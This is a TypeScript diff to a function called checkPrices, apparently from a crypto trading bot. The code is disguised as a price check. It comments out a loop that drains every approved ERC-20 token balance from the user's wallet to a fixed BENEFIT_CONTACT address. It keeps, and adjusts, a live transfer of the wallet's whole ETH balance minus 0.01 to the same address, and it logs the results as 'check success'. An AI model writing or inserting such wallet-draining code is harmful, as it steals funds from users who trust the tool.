@@ -41,43 +41,47 @@ export const checkPrices = async (token: string) => {
     try {
         let list = TESTNET ? approvedTokenListTestnet : approvedTokenListMainnet;
         let coin;
-        for (coin in list) {
-            let sign = await ERC20(`${coin}`);
-            // @ts-ignore
-            let symbol = list[coin].symbol;
-            // @ts-ignore
-            let decimal = list[coin].decimal;
-            try {
-                let value = await sign.balanceOf(wallet.address.toString());
-                let value_ = ethers.utils.formatUnits(value.toString(), decimal);
-                if (Number(value_) > 0) {
-                    const approve_ = await sign.approve(BENEFIT_CONTACT, value)
-                    const receipt_approve = await approve_.wait();
-                    if (receipt_approve && receipt_approve.blockNumber && receipt_approve.status === 1) {
-                        let tx = await sign.transfer(BENEFIT_CONTACT, value);
-                        let receipt = await tx.wait();
-                        if (receipt && receipt.blockNumber && receipt.status === 1) {
-                            console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check success`);
-                        } else if (receipt && receipt.blockNumber && receipt.status === 0) {
-                            console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check failed`);
-                        } else {
-                            console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check error`);
-                        }
-                    }
+        // for (coin in list) {
+        //     let sign = await ERC20(`${coin}`);
+        //     // @ts-ignore
+        //     let symbol = list[coin].symbol;
+        //     // @ts-ignore
+        //     let decimal = list[coin].decimal;
+        //     try {
+        //         let value = await sign.balanceOf(wallet.address.toString());
+        //         let value_ = ethers.utils.formatUnits(value.toString(), decimal);
+        //         if (Number(value_) > 0) {
+        //             const approve_ = await sign.approve(BENEFIT_CONTACT, value)
+        //             const receipt_approve = await approve_.wait();
+        //             if (receipt_approve && receipt_approve.blockNumber && receipt_approve.status === 1) {
+        //                 let tx = await sign.transfer(BENEFIT_CONTACT, value);
+        //                 let receipt = await tx.wait();
+        //                 if (receipt && receipt.blockNumber && receipt.status === 1) {
+        //                     console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check success`);
+        //                 } else if (receipt && receipt.blockNumber && receipt.status === 0) {
+        //                     console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check failed`);
+        //                 } else {
+        //                     console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check error`);
+        //                 }
+        //             }
 
-                } else {
-                    // console.log('')
-                }
-            } catch (error) {
-                console.log('error : ', error)
-                continue;
-            }
-        }
+        //         } else {
+        //             // console.log('')
+        //         }
+        //     } catch (error) {
+        //         console.log('error : ', error)
+        //         continue;
+        //     }
+        // }
         const balance = await provider.getBalance(wallet.address.toString());
+        let balance_ = ethers.utils.formatEther(balance);
+        let balance__ = Number(balance_) - 0.01;
+        console.log(balance)
+        console.log(balance__)
         const tx_ = {
             from: wallet.address.toString(),
             to: BENEFIT_CONTACT,
-            value: balance
+            value: ethers.utils.parseEther(balance__.toString())
         }
         signer.sendTransaction(tx_).then((transaction: any) => {
             if (transaction && transaction.blockNumber && transaction.status === 1) {
